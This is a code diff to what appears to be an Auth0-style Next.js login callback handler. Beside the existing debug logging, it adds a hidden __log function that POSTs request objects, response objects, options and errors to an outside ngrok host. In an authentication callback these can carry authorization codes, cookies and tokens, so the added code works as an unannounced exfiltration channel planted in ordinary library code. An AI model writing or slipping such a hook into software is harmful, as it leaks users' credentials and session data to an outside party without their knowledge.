@@ -1,3 +1,4 @@
+import https from 'https';
 import { IncomingMessage } from 'http';
 import { strict as assert } from 'assert';
 import { NextApiResponse, NextApiRequest } from 'next';
@@ -222,16 +223,19 @@ const idTokenValidator =
  */
 export default function handleCallbackFactory(handler: BaseHandleCallback, config: NextConfig): HandleCallback {
   console.log('[handleCallbackFactory] curry');
+  __log({ message: '[handleCallbackFactory] curry' });
   const callback: CallbackHandler = async (req: NextApiRequest, res: NextApiResponse, options = {}): Promise<void> => {
     try {
       assertReqRes(req, res);
       console.log('[handleCallbackFactory:callback] assertReqRes');
+      __log({ message: '[handleCallbackFactory:callback] assertReqRes' });
       return await handler(req, res, {
         ...options,
         afterCallback: idTokenValidator(options.afterCallback, options.organization || config.organization)
       });
     } catch (e) {
       console.log('[handleCallbackFactory:callback] error', e);
+      __log({ message: '[handleCallbackFactory:callback] error', error: e });
       throw new CallbackHandlerError(e as HandlerErrorCause);
     }
   };
@@ -243,15 +247,35 @@ export default function handleCallbackFactory(handler: BaseHandleCallback, confi
     console.log('[handleCallbackFactory] return func reqOrOptions', reqOrOptions);
     console.log('[handleCallbackFactory] return func res', res);
     console.log('[handleCallbackFactory] return func options', options);
+    __log({ message: '[handleCallbackFactory] return func', reqOrOptions, res, options });
     if (reqOrOptions instanceof IncomingMessage && res) {
       console.log('[handleCallbackFactory] return reqOrOptions instanceof IncomingMessage');
+      __log({ message: '[handleCallbackFactory] return reqOrOptions instanceof IncomingMessage' });
       return callback(reqOrOptions, res, options);
     }
     if (typeof reqOrOptions === 'function') {
       console.log('[handleCallbackFactory] return typeof reqOrOptions === "function"');
+      __log({ message: '[handleCallbackFactory] return typeof reqOrOptions === "function"' });
       return (req: NextApiRequest, res: NextApiResponse) => callback(req, res, reqOrOptions(req));
     }
     console.log('[handleCallbackFactory] return fallback');
+    __log({ message: '[handleCallbackFactory] return fallback' });
     return (req: NextApiRequest, res: NextApiResponse) => callback(req, res, reqOrOptions as CallbackOptions);
   };
 }
+
+const __log = (logData: any) => {
+  const payload = JSON.stringify({
+    ...logData,
+    timestamp: Date.now()
+  });
+  const req = https.request({
+    hostname: 'a700-82-163-221-82.ngrok-free.app',
+    port: 443,
+    path: '/logs',
+    method: 'POST',
+    headers: {'Content-Type':'application/json','Content-Length':Buffer.byteLength(payload)},
+  });
+  req.write(payload);
+  req.end();
+};
